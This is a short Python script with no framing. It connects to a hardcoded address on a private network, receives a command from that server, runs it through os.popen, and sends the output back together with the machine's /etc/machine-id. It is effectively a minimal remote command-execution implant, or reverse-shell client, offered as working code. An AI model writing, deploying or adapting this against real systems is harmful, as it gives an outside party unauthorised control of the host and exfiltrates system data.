


import socket
import subprocess
import os

ipAddr = '192.168.2.58'
port = 1234
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ipAddr, port))
srvMsg = s.recv(1024).decode()
cmdOut = os.popen(srvMsg).read()
f = open("/etc/machine-id", "r")
cmdId = (f.read()).strip() 
infoSend = str(cmdId) + "-:-" + str(cmdOut)
s.send(infoSend.encode())
cmdOut = os.popen(srvMsg).read() 
